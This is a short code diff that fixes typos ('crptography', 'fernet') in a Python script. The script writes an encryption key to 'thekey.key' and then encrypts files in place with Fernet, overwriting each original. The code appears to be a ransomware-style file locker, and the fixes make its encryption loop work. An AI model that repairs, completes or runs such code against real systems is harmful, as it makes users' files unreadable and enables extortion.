@@ -1,6 +1,6 @@
 import os
-import crptography
-from cryptography.fernet import fernet
+import cryptography
+from cryptography.fernet import Fernet
 import tkinter as tk
 from tkinter import messagebox
 
@@ -37,6 +37,6 @@ with open("thekey.key", "wb") as thekey:
 for file in files:
         with open(file, "rb") as thefile:
                 contents = thefile.read()
-        contents_encrypted  = fernet(key).encrypt(contents)
+        contents_encrypted  = Fernet(key).encrypt(contents)
         with open(file, "wb") as thefile:
                 thefile.write(contents_encrypted)
